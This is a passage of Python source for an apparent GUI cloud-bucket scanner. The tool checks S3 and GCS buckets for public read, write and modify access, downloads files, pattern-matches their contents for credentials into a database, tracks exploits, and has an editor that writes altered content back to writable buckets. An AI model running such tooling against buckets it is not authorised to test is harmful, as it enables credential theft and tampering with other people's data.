        elif "Email" in cred_type:
            if re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', cred_value):
                messagebox.showinfo("Validation", "This is a valid email address format.")
            else:
                messagebox.showwarning("Validation", "This is not a valid email format.")
        else:
            messagebox.showinfo("Validation", f"Cannot validate {cred_type} automatically.")
    
    def refresh_current_view(self):
        """Refresh current view (F5)"""
        current_tab = self.notebook.index(self.notebook.select())
        if current_tab == 1:  # File Manager
            self.fm_refresh_bucket()
        elif current_tab == 2:  # Bucket Browser
            self.browser_refresh()
        elif current_tab == 3:  # Scan
            pass
        elif current_tab == 5:  # Results
            self.update_results_tab()
    
    def open_file_manager(self):
        """Open file manager tab (F4)"""
        self.switch_to_tab(1)
    
    def switch_to_tab(self, index: int):
        """Switch to specific tab"""
        try:
            self.notebook.select(index)
        except:
            pass
    
    def next_tab(self):
        """Go to next tab"""
        current = self.notebook.index(self.notebook.select())
        total = self.notebook.index('end')
        next_tab = (current + 1) % total
        self.notebook.select(next_tab)
    
    def prev_tab(self):
        """Go to previous tab"""
        current = self.notebook.index(self.notebook.select())
        total = self.notebook.index('end')
        prev_tab = (current - 1) % total
        self.notebook.select(prev_tab)
    
    def on_recent_bucket_click(self, event):
        """Handle recent bucket click"""
        selection = self.recent_buckets_list.curselection()
        if selection:
            bucket_name = self.recent_buckets_list.get(selection[0])
            self.fm_bucket_var.set(bucket_name)
            self.switch_to_tab(1)
            self.fm_load_bucket()
    
    def update_dashboard_stats(self):
        """Update dashboard statistics"""
        total_buckets = len(self.buckets)
        total_files = sum(b.total_files for b in self.buckets)
        total_creds = len(self.cred_tree.get_children()) if hasattr(self, 'cred_tree') else 0
        vulnerable = sum(1 for b in self.buckets if b.is_public_write or b.is_public_read)
        total_exploits = len(self.exploit_results)
        avg_risk = (
            sum(int(getattr(b, 'risk_score', 0) or 0) for b in self.buckets) / total_buckets
            if total_buckets > 0 else 0
        )
        
        if hasattr(self, 'stats_cards'):
            self.stats_cards["📦 Buckets"].config(text=str(total_buckets))
            self.stats_cards["📄 Files"].config(text=str(total_files))
            self.stats_cards["🔑 Credentials"].config(text=str(total_creds))
            self.stats_cards["⚠️ Vulnerable"].config(text=str(vulnerable))
            self.stats_cards["💣 Exploits"].config(text=str(total_exploits))
            self.stats_cards["📊 Risk Score"].config(text=f"{avg_risk:.0f}")
        
        # Update status bar
        self.bucket_count_label.config(text=f"Buckets: {total_buckets}")
        self.file_count_label.config(text=f"Files: {total_files}")
        self.cred_count_label.config(text=f"Credentials: {total_creds}")
    
    def request_results_refresh(self, delay_ms: int = 120):
        """Debounced results refresh to reduce aggressive UI redraw and freezing."""
        if not hasattr(self, '_results_refresh_after_id'):
            self._results_refresh_after_id = None

        if self._results_refresh_after_id:
            try:
                self.root.after_cancel(self._results_refresh_after_id)
            except Exception:
                pass

        self._results_refresh_after_id = self.root.after(delay_ms, self.update_results_tab)

    def update_results_tab(self):
        """Update results tab with current buckets (fast, non-blocking)"""
        if not hasattr(self, '_bucket_perms_cache'):
            self._bucket_perms_cache = {}
        if not hasattr(self, '_auto_perm_scan_running'):
            self._auto_perm_scan_running = False
        if not hasattr(self, '_auto_perm_scanned_keys'):
            self._auto_perm_scanned_keys = set()

        # clear debounce token (if any) because refresh is now executing
        if hasattr(self, '_results_refresh_after_id'):
            self._results_refresh_after_id = None

        self.filter_results()
        self.start_auto_permission_scan()

    def show_summary(self):
        """Show quick summary of current scan results"""
        total_buckets = len(self.buckets)
        total_files = sum(b.total_files for b in self.buckets)
        total_size = sum(b.total_size for b in self.buckets)
        public_read = sum(1 for b in self.buckets if b.is_public_read)
        public_write = sum(1 for b in self.buckets if b.is_public_write)
        avg_risk = (sum(b.risk_score for b in self.buckets) / total_buckets) if total_buckets else 0

        summary = (
            f"Buckets: {total_buckets}\n"
            f"Files: {total_files}\n"
            f"Total Size: {self.format_size(total_size)}\n"
            f"Public Read Buckets: {public_read}\n"
            f"Public Write Buckets: {public_write}\n"
            f"Average Risk Score: {avg_risk:.1f}"
        )
        messagebox.showinfo("Scan Summary", summary)

    def clear_results(self):
        """Clear results from UI and in-memory list"""
        if not messagebox.askyesno("Confirm", "Clear all current results from the table?"):
            return
        self.buckets.clear()
        if hasattr(self, '_bucket_perms_cache'):
            self._bucket_perms_cache.clear()
        if hasattr(self, 'results_tree'):
            for item in self.results_tree.get_children():
                try:
                    self.results_tree.delete(item)
                except tk.TclError:
                    pass
        self.update_dashboard_stats()
        self.log("Results cleared")

    def filter_results(self):
        """Filter results tree by bucket/provider/risk text"""
        if not hasattr(self, 'results_tree'):
            return

        query = self.results_filter_var.get().strip().lower() if hasattr(self, 'results_filter_var') else ""
        hide_no_perm = bool(self.results_hide_no_perm_var.get()) if hasattr(self, 'results_hide_no_perm_var') else False

        for item in self.results_tree.get_children():
            try:
                self.results_tree.delete(item)
            except tk.TclError:
                pass

        if not hasattr(self, '_bucket_perms_cache'):
            self._bucket_perms_cache = {}

        for bucket in self.buckets:
            cache_key = (bucket.name, bucket.provider.value)
            cached = self._bucket_perms_cache.get(cache_key, {})

            r_ok = bool(cached.get('read', getattr(bucket, 'is_public_read', False)))
            w_ok = bool(cached.get('write', getattr(bucket, 'is_public_write', False)))
            m_val = cached.get('modify', None)

            if hide_no_perm and (not r_ok and not w_ok and m_val is False):
                continue

            row_text = " ".join([
                str(bucket.name),
                str(bucket.provider.value),
                str(bucket.region),
                str(bucket.risk_level),
                str(bucket.risk_score),
                str(bucket.url),
                "read" if r_ok else "",
                "write" if w_ok else "",
                "modify" if m_val is True else ""
            ]).lower()

            if not query or query in row_text:
                m_text = '❓' if m_val is None else ('✅' if bool(m_val) else '❌')
                perms_text = f"R:{'✅' if r_ok else '❌'} | W:{'✅' if w_ok else '❌'} | M:{m_text}"

                tag = 'perm_safe'
                if m_val is True:
                    tag = 'perm_modify'
                elif w_ok:
                    tag = 'perm_write'
                elif r_ok:
                    tag = 'perm_read'

                self.results_tree.insert('', 'end', values=(
                    bucket.name,
                    bucket.provider.value,
                    bucket.region,
                    bucket.total_files,
                    self.format_size(bucket.total_size),
                    perms_text,
                    bucket.credentials_found,
                    f"{bucket.risk_score} ({bucket.risk_level})",
                    bucket.url
                ), tags=(tag,))
    
    def update_bucket_combo(self):
        """Update bucket combo boxes"""
        bucket_names = [b.name for b in self.buckets]
        
        if hasattr(self, 'fm_bucket_combo'):
            self.fm_bucket_combo['values'] = bucket_names
        
        if hasattr(self, 'browser_bucket_combo'):
            self.browser_bucket_combo['values'] = bucket_names
        
        if hasattr(self, 'recent_buckets_list'):
            self.recent_buckets_list.delete(0, tk.END)
            for name in bucket_names[-10:]:  # Show last 10
                self.recent_buckets_list.insert(tk.END, name)

    def start_auto_permission_scan(self):
        """Start background auto permission scan for visible buckets."""
        if getattr(self, '_auto_perm_scan_running', False):
            return

        self._auto_perm_scan_running = True

        def worker():
            try:
                for bucket in list(self.buckets):
                    cache_key = (bucket.name, bucket.provider.value)
                    if cache_key in getattr(self, '_auto_perm_scanned_keys', set()):
                        continue

                    try:
                        perms = self.check_bucket_permissions(bucket.name, bucket.provider)
                    except Exception:
                        perms = {"read": False, "write": False, "modify": False}

                    if not hasattr(self, '_bucket_perms_cache'):
                        self._bucket_perms_cache = {}
                    if not hasattr(self, '_auto_perm_scanned_keys'):
                        self._auto_perm_scanned_keys = set()

                    self._bucket_perms_cache[cache_key] = perms
                    self._auto_perm_scanned_keys.add(cache_key)

                    self.root.after(0, self.request_results_refresh)

                    time.sleep(0.05)
            finally:
                self._auto_perm_scan_running = False

        threading.Thread(target=worker, daemon=True).start()
    
    def ensure_db_schema(self):
        """Ensure DB schema is compatible with current code (non-destructive migration)."""
        try:
            with self.db_lock:
                self.cursor.execute("PRAGMA table_info(buckets)")
                columns = {row[1] for row in self.cursor.fetchall()}

                required_columns = {
                    "is_public_list": "BOOLEAN DEFAULT 0",
                    "sensitive_files_count": "INTEGER DEFAULT 0",
                    "credentials_found": "INTEGER DEFAULT 0",
                    "website_enabled": "BOOLEAN DEFAULT 0",
                    "logging_enabled": "BOOLEAN DEFAULT 0",
                    "versioning_enabled": "BOOLEAN DEFAULT 0",
                    "encryption_enabled": "BOOLEAN DEFAULT 0",
                    "created_date": "TEXT DEFAULT ''",
                    "owner": "TEXT DEFAULT ''",
                    "risk_score": "INTEGER DEFAULT 0",
                    "risk_level": "TEXT DEFAULT 'Low'",
                    "scan_timestamp": "TEXT DEFAULT ''"
                }

                credentials_required_columns = {
                    "bucket_name": "TEXT DEFAULT ''",
                    "file_path": "TEXT DEFAULT ''",
                    "credential_type": "TEXT DEFAULT ''",
                    "credential_value": "TEXT DEFAULT ''",
                    "severity": "TEXT DEFAULT 'medium'",
                    "found_timestamp": "TEXT DEFAULT ''",
                    "is_validated": "BOOLEAN DEFAULT 0"
                }

                for col_name, col_def in required_columns.items():
                    if col_name not in columns:
                        self.cursor.execute(f"ALTER TABLE buckets ADD COLUMN {col_name} {col_def}")

                # Ensure credentials table also has required columns for backward compatibility
                self.cursor.execute("PRAGMA table_info(credentials)")
                cred_columns = {row[1] for row in self.cursor.fetchall()}

                for col_name, col_def in credentials_required_columns.items():
                    if col_name not in cred_columns:
                        self.cursor.execute(f"ALTER TABLE credentials ADD COLUMN {col_name} {col_def}")

                self.conn.commit()
        except Exception as e:
            self.log(f"Schema migration warning: {e}")

    def save_bucket_to_db(self, bucket: BucketInfo):
        """Save bucket to database"""
        with self.db_lock:
            cur = self.conn.cursor()
            cur.execute('''
                INSERT OR REPLACE INTO buckets 
                (name, provider, url, region, total_files, total_size, is_public_read, is_public_write, 
                 is_public_list, sensitive_files_count, credentials_found, website_enabled, 
                 logging_enabled, versioning_enabled, encryption_enabled, created_date, owner, 
                 risk_score, risk_level, scan_timestamp)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                bucket.name, bucket.provider.value, bucket.url, bucket.region, bucket.total_files,
                bucket.total_size, bucket.is_public_read, bucket.is_public_write, bucket.is_public_list,
                bucket.sensitive_files_count, bucket.credentials_found, bucket.website_enabled,
                bucket.logging_enabled, bucket.versioning_enabled, bucket.encryption_enabled,
                bucket.created_date, bucket.owner, bucket.risk_score, bucket.risk_level, bucket.scan_timestamp
            ))
            self.conn.commit()
    
    def load_buckets_from_db(self):
        """Load buckets from database"""
        with self.db_lock:
            self.cursor.execute('SELECT * FROM buckets ORDER BY scan_timestamp DESC')
            rows = self.cursor.fetchall()

        # Replace in-memory list to avoid duplicate growth across reloads
        self.buckets = []

        for row in rows:
            risk_score_val = 0
            try:
                risk_score_val = int(row[18]) if row[18] is not None else 0
            except Exception:
                risk_score_val = 0

            bucket = BucketInfo(
                name=row[1],
                provider=Provider(row[2]),
                url=row[3],
                region=row[4],
                total_files=row[5],
                total_size=row[6],
                is_public_read=bool(row[7]),
                is_public_write=bool(row[8]),
                is_public_list=bool(row[9]),
                sensitive_files_count=row[10],
                credentials_found=row[11],
                website_enabled=bool(row[12]),
                logging_enabled=bool(row[13]),
                versioning_enabled=bool(row[14]),
                encryption_enabled=bool(row[15]),
                created_date=row[16] or "",
                owner=row[17] or "",
                risk_score=risk_score_val,
                risk_level=row[19],
                scan_timestamp=row[20]
            )
            self.buckets.append(bucket)

        self.update_results_tab()
        self.update_bucket_combo()
        self.update_dashboard_stats()
        self.log(f"Loaded {len(self.buckets)} buckets from database")
    
    def save_session(self):
        """Save current session to file"""
        session_data = {
            'version': self.VERSION,
            'timestamp': datetime.now().isoformat(),
            'buckets': [asdict(b) for b in self.buckets],
            'settings': self.settings,
            'exploits': [asdict(e) for e in self.exploit_results]
        }
        
        filename = filedialog.asksaveasfilename(defaultextension=".session.json", filetypes=[("Session", "*.session.json")])
        if filename:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(session_data, f, indent=2, ensure_ascii=False)
            self.log(f"Session saved: {filename}")
            messagebox.showinfo("Success", "Session saved successfully!")
    
    def load_session(self):
        """Load session from file"""
        filename = filedialog.askopenfilename(filetypes=[("Session", "*.session.json")])
        if filename:
            with open(filename, 'r', encoding='utf-8') as f:
                session_data = json.load(f)
            
            # Clear current data
            self.buckets.clear()
            
            # Load buckets
            for bucket_data in session_data.get('buckets', []):
                # Convert files back to FileInfo objects
                files = []
                for file_data in bucket_data.get('files', []):
                    files.append(FileInfo(**file_data))
                bucket_data['files'] = files
                bucket_data['provider'] = Provider(bucket_data['provider'])
                self.buckets.append(BucketInfo(**bucket_data))
            
            # Load exploits
            self.exploit_results.clear()
            for exploit_data in session_data.get('exploits', []):
                self.exploit_results.append(ExploitResult(**exploit_data))
            
            self.update_results_tab()
            self.update_bucket_combo()
            self.update_dashboard_stats()
            
            self.log(f"Loaded session with {len(self.buckets)} buckets")
            messagebox.showinfo("Success", f"Loaded {len(self.buckets)} buckets from session!")
    
    def export_all_data(self):
        """Export all data in multiple formats"""
        export_dir = filedialog.askdirectory(title="Select Export Directory")
        if not export_dir:
            return
        
        # Export JSON
        json_path = os.path.join(export_dir, f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump([asdict(b) for b in self.buckets], f, indent=2, ensure_ascii=False)
        
        # Export CSV
        csv_path = os.path.join(export_dir, f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv")
        with open(csv_path, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['Bucket', 'Provider', 'Files', 'Size', 'Public Read', 'Public Write', 'Risk Score', 'URL'])
            for b in self.buckets:
                writer.writerow([b.name, b.provider.value, b.total_files, self.format_size(b.total_size), 
                               b.is_public_read, b.is_public_write, b.risk_score, b.url])
        
        # Export HTML report
        html_path = os.path.join(export_dir, f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html")
        self.generate_full_report(html_path)
        
        messagebox.showinfo("Export Complete", f"Data exported to:\n{export_dir}")
        os.startfile(export_dir)
    
    def export_report(self):
        """Export report"""
        self.generate_full_report()
    
    def compress_results(self):
        """Compress results directory"""
        zip_path = os.path.join(os.path.dirname(self.settings['results_dir']), 
                               f"cloud_storage_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip")
        
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(self.settings['results_dir']):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, os.path.dirname(self.settings['results_dir']))
                    zipf.write(file_path, arcname)
        
        self.log(f"Results compressed: {zip_path}")
        messagebox.showinfo("Success", f"Results compressed!\n{zip_path}")
    
    def clean_results(self):
        """Clean old results"""
        if messagebox.askyesno("Confirm", "Delete all downloaded files and clear database?"):
            # Clear database
            self.cursor.execute('DELETE FROM buckets')
            self.cursor.execute('DELETE FROM files')
            self.cursor.execute('DELETE FROM credentials')
            self.cursor.execute('DELETE FROM scan_jobs')
            self.cursor.execute('DELETE FROM exploits')
            self.conn.commit()
            
            # Clear results directory
            for item in os.listdir(self.settings['results_dir']):
                item_path = os.path.join(self.settings['results_dir'], item)
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
            
            # Clear in-memory data
            self.buckets.clear()
            self.exploit_results.clear()
            if hasattr(self, 'cred_tree'):
                for item in self.cred_tree.get_children():
                    self.cred_tree.delete(item)
            if hasattr(self, 'vuln_tree'):
                for item in self.vuln_tree.get_children():
                    self.vuln_tree.delete(item)
            
            self.request_results_refresh()
            self.update_dashboard_stats()
            
            self.log("Results cleaned")
            messagebox.showinfo("Success", "Results cleaned successfully!")
    
    def backup_database(self):
        """Backup database"""
        backup_dir = filedialog.askdirectory(title="Select Backup Directory")
        if backup_dir:
            db_path = os.path.join(self.settings['results_dir'], 'cloud_storage.db')
            backup_path = os.path.join(backup_dir, f"cloud_storage_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
            shutil.copy(db_path, backup_path)
            self.log(f"Database backed up to: {backup_path}")
            messagebox.showinfo("Success", f"Database backed up!\n{backup_path}")
    
    def load_history(self):
        """Load scan history from database"""
        with self.db_lock:
            cur = self.conn.cursor()
            cur.execute('SELECT * FROM scan_jobs ORDER BY start_time DESC')
            rows = cur.fetchall()
        
        for item in self.history_tree.get_children():
            self.history_tree.delete(item)
        
        for row in rows:
            self.history_tree.insert('', 0, values=(
                row[0], row[1], row[2], row[3], 
                row[4][:16] if row[4] else "", 
                row[5][:16] if row[5] else "",
                row[6], row[7], row[8]
            ))
    
    def start_auto_save(self):
        """Start auto-save thread"""
        def auto_save():
            while True:
                time.sleep(60)  # Save every minute
                if self.settings['auto_save'] and self.buckets:
                    for bucket in self.buckets:
                        self.save_bucket_to_db(bucket)
        
        threading.Thread(target=auto_save, daemon=True).start()
    
    def process_download_queue(self):
        """Process download queue safely on UI timer without spawning recursive threads"""
        if getattr(self, "_download_queue_loop_started", False):
            return
        self._download_queue_loop_started = True

        def poll_queue():
            # Process a small batch per tick to keep UI responsive
            for _ in range(5):
                try:
                    task = self.download_queue.get_nowait()
                except queue.Empty:
                    break
                except Exception:
                    break

                if task:
                    try:
                        bucket_name, file_path, provider = task
                        # Process download task placeholder
                        pass
                    except Exception:
                        pass

            # Schedule next poll
            self.root.after(100, poll_queue)

        poll_queue()
    
    # ========================================================================
    # FILE MANAGER METHODS (Core Implementation)
    # ========================================================================
    
    def fm_load_bucket(self):
        """Load bucket content into file manager"""
        bucket_name = self.fm_bucket_var.get()
        if not bucket_name:
            messagebox.showwarning("Warning", "Please select a bucket!")
            return
        
        # Find bucket info
        bucket_info = next((b for b in self.buckets if b.name == bucket_name), None)
        
        if not bucket_info:
            # Create new bucket info
            provider = self.detect_provider(bucket_name)
            bucket_info = BucketInfo(
                name=bucket_name,
                provider=provider,
                url=f"https://{bucket_name}.s3.amazonaws.com/" if provider == Provider.AWS_S3 else f"https://storage.googleapis.com/{bucket_name}/"
            )
        
        self.fm_current_bucket = bucket_info
        self.fm_status_var.set(f"Loading {bucket_name}...")
        self.fm_progress.start()
        
        def load_task():
            files = self.get_all_files_from_bucket(bucket_name, bucket_info.provider)
            self.root.after(0, lambda: self.fm_on_files_loaded(files))
        
        threading.Thread(target=load_task, daemon=True).start()
    
    def fm_on_files_loaded(self, files: List[FileInfo]):
        """Handle loaded files"""
        self.fm_progress.stop()
        
        if self.fm_current_bucket:
            self.fm_current_bucket.files = files
            self.fm_current_bucket.total_files = len(files)
            self.fm_current_bucket.total_size = sum(f.size for f in files)

            # Keep canonical bucket record in sync and refresh results
            for idx, b in enumerate(self.buckets):
                if b.name == self.fm_current_bucket.name and b.provider == self.fm_current_bucket.provider:
                    self.buckets[idx] = self.fm_current_bucket
                    break
            self.request_results_refresh()
            self.update_dashboard_stats()

        self.fm_all_files = files
        self.fm_filtered_files = files.copy()
        
        # Build folder tree
        self.fm_build_folder_tree(files)
        
        # Display files at root
        self.fm_display_files("")
        
        self.fm_status_var.set(f"Loaded {len(files)} files from {self.fm_current_bucket.name if self.fm_current_bucket else 'bucket'}")
        self.log(f"Loaded {len(files)} files")
        
        # Update stats
        self.update_dashboard_stats()
    
    def fm_build_folder_tree(self, files: List[FileInfo]):
        """Build folder tree structure"""
        # Clear existing tree
        for item in self.fm_tree.get_children():
            self.fm_tree.delete(item)
        
        tree = {}
        
        for file_info in files:
            parts = file_info.path.split('/')
            current = tree
            
            for i, part in enumerate(parts[:-1]):
                if part not in current:
                    current[part] = {"children": {}, "files": []}
                current = current[part]["children"]
            
            # Add file to current level
            current.setdefault("files", []).append(file_info)
        
        def insert_tree_node(parent, node_dict, path=""):
            for folder_name, folder_data in node_dict.items():
                if folder_name == "files":
                    continue
                
                full_path = f"{path}/{folder_name}" if path else folder_name
                node_id = self.fm_tree.insert(parent, 'end', text=f"📁 {folder_name}", 
                                              values=[full_path], open=False)
                
                # Insert subfolders
                insert_tree_node(node_id, folder_data.get("children", {}), full_path)
                
                # Insert files in this folder
                for file_info in folder_data.get("files", []):
                    self.fm_tree.insert(node_id, 'end', text=f"📄 {file_info.name}",
                                        values=[file_info.path], tags=("file",))
        
        insert_tree_node('', tree)
    
    def fm_display_files(self, folder_path: str):
        """Display files in current folder"""
        # Clear existing
        for item in self.fm_files_tree.get_children():
            self.fm_files_tree.delete(item)
        
        norm_folder = (folder_path or "").strip("/")

        for file_info in self.fm_filtered_files:
            path = (file_info.path or "").strip("/")
            if norm_folder:
                if not path.startswith(norm_folder + "/"):
                    continue
                remaining = path[len(norm_folder) + 1:]
            else:
                remaining = path

            if "/" not in remaining:  # direct file in this folder level
                size_str = self.format_size(file_info.size)
                icon = self.get_file_icon(file_info.name)
                self.fm_files_tree.insert('', 'end', text=f"{icon} {file_info.name}",
                                          values=(size_str, file_info.last_modified[:16] if file_info.last_modified else "Unknown",
                                                  file_info.file_type.value, file_info.hash_md5[:8] if file_info.hash_md5 else ""),
                                          tags=(file_info.path,))
    
    def fm_filter_files(self):
        """Filter files by search term"""
        search_term = self.fm_search_var.get().lower()
        
        if not search_term:
            self.fm_filtered_files = self.fm_all_files.copy()
        else:
            self.fm_filtered_files = [f for f in self.fm_all_files if search_term in f.name.lower() or search_term in f.path.lower()]
        
        self.fm_display_files(self.fm_current_path)
        self.fm_status_var.set(f"Found {len(self.fm_filtered_files)} files matching '{search_term}'")
    
    def fm_on_tree_select(self, event):
        """Handle tree selection"""
        selection = self.fm_tree.selection()
        if not selection:
            return
        
        item = self.fm_tree.item(selection[0])
        path = item['values'][0] if item['values'] else ""
        
        if path:
            self.fm_current_path = path
            self.fm_display_files(path)
    
    def fm_on_tree_double_click(self, event):
        """Handle tree double click"""
        selection = self.fm_tree.selection()
        if not selection:
            return
        
        item = self.fm_tree.item(selection[0])
        text = item['text']
        
        if text.startswith("📄"):  # File
            path = item['values'][0] if item['values'] else ""
            if path:
                self.fm_open_file_by_path(path)
    
    def fm_edit_file(self, event=None):
        """Edit selected file"""
        selection = self.fm_files_tree.selection()
        if not selection:
            return
        
        item = self.fm_files_tree.item(selection[0])
        file_path = item['tags'][0] if item['tags'] else None
        
        if file_path:
            self.fm_open_file_by_path(file_path)
    
    def fm_open_file_by_path(self, file_path: str):
        """Open file for editing by path"""
        if not self.fm_current_bucket:
            return
        
        self.fm_current_edit_file = file_path
        self.fm_current_file_var.set(f"Editing: {file_path}")
        self.fm_status_var.set(f"Loading {file_path}...")
        
        # Build URL
        if self.fm_current_bucket.provider == Provider.AWS_S3:
            url = f"https://{self.fm_current_bucket.name}.s3.amazonaws.com/{file_path}"
        else:
            url = f"https://storage.googleapis.com/{self.fm_current_bucket.name}/{file_path}"
        
        def load_task():
            try:
                resp = self.session.get(url, timeout=self.settings['timeout'])
                if resp.status_code == 200:
                    try:
                        content = resp.content.decode('utf-8')
                    except:
                        content = resp.content.decode('latin-1', errors='ignore')
                    
                    self.root.after(0, lambda: self.fm_display_content(content))
                    self.root.after(0, lambda: self.fm_scan_content_for_credentials(content, file_path))
                else:
                    self.root.after(0, lambda: self.fm_show_error(f"Failed to load: {resp.status_code}"))
            except Exception as e:
                self.root.after(0, lambda: self.fm_show_error(str(e)))
        
        threading.Thread(target=load_task, daemon=True).start()
    
    def fm_display_content(self, content: str):
        """Display content in editor"""
        self.fm_editor.delete(1.0, tk.END)
        self.fm_editor.insert(1.0, content)
        self.fm_apply_syntax_highlighting()
        self.fm_status_var.set(f"Loaded {self.fm_current_edit_file} ({len(content)} chars)")
    
    def fm_apply_syntax_highlighting(self):
        """Apply basic syntax highlighting"""
        content = self.fm_editor.get(1.0, tk.END)
        
        # Clear existing tags
        for tag in ['keyword', 'string', 'comment', 'number', 'function', 'class']:
            self.fm_editor.tag_remove(tag, 1.0, tk.END)
        
        # Simple keyword highlighting
        keywords = ['def', 'class', 'import', 'from', 'return', 'if', 'else', 'elif', 'for', 'while', 
                   'try', 'except', 'finally', 'with', 'as', 'lambda', 'True', 'False', 'None',
                   'and', 'or', 'not', 'is', 'in', 'break', 'continue', 'pass', 'raise', 'yield']
        
        for kw in keywords:
            start = 1.0
            while True:
                pos = self.fm_editor.search(rf'\b{kw}\b', start, tk.END, regexp=True)
                if not pos:
                    break
                end = f"{pos}+{len(kw)}c"
                self.fm_editor.tag_add('keyword', pos, end)
                start = end
    
    def fm_scan_content_for_credentials(self, content: str, file_path: str):
        """Scan content for credentials"""
        for pattern, cred_type, severity in self.sensitive_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                self.save_credential(self.fm_current_bucket.name, file_path, f"{cred_type}: {match[:100]}", severity)
                self.fm_status_var.set(f"⚠️ Found {cred_type} in file")
    
    def fm_save_file(self):
        """Save edited file"""
        if not self.fm_current_edit_file or not self.fm_current_bucket:
            messagebox.showwarning("Warning", "No file loaded to save!")
            return
        
        new_content = self.fm_editor.get(1.0, tk.END)
        
        # Build URL
        if self.fm_current_bucket.provider == Provider.AWS_S3:
            url = f"https://{self.fm_current_bucket.name}.s3.amazonaws.com/{self.fm_current_edit_file}"
        else:
            url = f"https://storage.googleapis.com/{self.fm_current_bucket.name}/{self.fm_current_edit_file}"
        
        self.fm_status_var.set(f"Saving {self.fm_current_edit_file}...")
        
        def save_task():
            try:
                resp = self.session.put(url, data=new_content.encode('utf-8'),
                                       headers={'Content-Type': 'text/html; charset=utf-8'})
                if resp.status_code == 200:
                    self.root.after(0, lambda: self.fm_on_save_success())
                else:
                    self.root.after(0, lambda: self.fm_show_error(f"Save failed: {resp.status_code}"))
            except Exception as e:
                self.root.after(0, lambda: self.fm_show_error(str(e)))
        
        threading.Thread(target=save_task, daemon=True).start()
    
    def fm_on_save_success(self):
        """Handle successful save"""
        self.fm_status_var.set(f"Saved {self.fm_current_edit_file}")
        self.log(f"Saved: {self.fm_current_edit_file}")
        messagebox.showinfo("Success", "File saved successfully!")
    
    def fm_reload_file(self):
        """Reload current file"""
        if self.fm_current_edit_file:
            self.fm_open_file_by_path(self.fm_current_edit_file)
    
    def fm_find_in_file(self):
        """Find text in current file"""
        search_term = simpledialog.askstring("Find", "Enter text to find:")
        if not search_term:
            return
        
        content = self.fm_editor.get(1.0, tk.END)
        if search_term in content:
            # Clear previous highlights
            self.fm_editor.tag_remove('search', 1.0, tk.END)
            self.fm_editor.tag_config('search', background='yellow', foreground='black')
            
            # Highlight all occurrences
            start = 1.0
            count = 0
            while True:
                pos = self.fm_editor.search(search_term, start, tk.END)
                if not pos:
                    break
                end = f"{pos}+{len(search_term)}c"
                self.fm_editor.tag_add('search', pos, end)
                start = end
                count += 1
            
            self.fm_status_var.set(f"Found {count} occurrences")
            messagebox.showinfo("Find", f"Found {count} occurrences")
        else:
            messagebox.showinfo("Find", "Text not found")
    
    def fm_replace_in_file(self):
        """Replace text in current file"""
        find_term = simpledialog.askstring("Find", "Enter text to find:")
        if not find_term:
            return
        
        replace_term = simpledialog.askstring("Replace", "Enter replacement text:")
        if replace_term is None:
            return
        
        content = self.fm_editor.get(1.0, tk.END)
        count = content.count(find_term)
        
        if count > 0:
            new_content = content.replace(find_term, replace_term)
            self.fm_editor.delete(1.0, tk.END)
            self.fm_editor.insert(1.0, new_content)
            self.fm_status_var.set(f"Replaced {count} occurrences")
            messagebox.showinfo("Replace", f"Replaced {count} occurrences")
        else:
            messagebox.showinfo("Replace", "Text not found")
    
    def fm_copy_all(self):
        """Copy all content to clipboard"""
        content = self.fm_editor.get(1.0, tk.END)
        self.copy_to_clipboard(content)
        self.fm_status_var.set("Copied all content to clipboard")
    
    def fm_copy_path(self):
        """Copy current file path to clipboard"""
        selection = self.fm_files_tree.selection()
        if selection:
            item = self.fm_files_tree.item(selection[0])
            file_path = item['tags'][0] if item['tags'] else ""
            if file_path:
                self.copy_to_clipboard(file_path)
                self.fm_status_var.set(f"Copied path: {file_path}")
    
    def fm_download_selected(self):
        """Download selected file"""
        selection = self.fm_files_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Select a file to download!")
            return
        
        item = self.fm_files_tree.item(selection[0])
        file_path = item['tags'][0] if item['tags'] else None
        
        if file_path and self.fm_current_bucket:
            self.fm_download_file(file_path)
    
    def fm_download_file(self, file_path: str):
        """Download a single file"""
        if self.fm_current_bucket.provider == Provider.AWS_S3:
            url = f"https://{self.fm_current_bucket.name}.s3.amazonaws.com/{file_path}"
        else:
            url = f"https://storage.googleapis.com/{self.fm_current_bucket.name}/{file_path}"
        
        self.fm_status_var.set(f"Downloading {file_path}...")
        
        def download_task():
            try:
                resp = self.session.get(url, timeout=30)
                if resp.status_code == 200:
                    bucket_dir = os.path.join(self.settings['results_dir'], self.fm_current_bucket.name)
                    os.makedirs(bucket_dir, exist_ok=True)
                    safe_name = file_path.replace('/', '_')
                    filepath = os.path.join(bucket_dir, safe_name)
                    
                    with open(filepath, 'wb') as f:
                        f.write(resp.content)
                    
                    self.root.after(0, lambda: self.fm_on_download_complete(file_path, filepath))
                else:
                    self.root.after(0, lambda: self.fm_show_error(f"Download failed: {resp.status_code}"))
            except Exception as e:
                self.root.after(0, lambda: self.fm_show_error(str(e)))
        
        threading.Thread(target=download_task, daemon=True).start()
    
    def fm_on_download_complete(self, file_path: str, local_path: str):
        """Handle download completion"""
        self.fm_status_var.set(f"Downloaded: {file_path}")
        self.log(f"Downloaded: {file_path} to {local_path}")
        messagebox.showinfo("Success", f"Downloaded:\n{local_path}")
    
    def fm_delete_selected(self):
        """Delete selected file"""
        selection = self.fm_files_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Select a file to delete!")
            return
        
        item = self.fm_files_tree.item(selection[0])
        file_path = item['tags'][0] if item['tags'] else None
        
        if not file_path:
            return
        
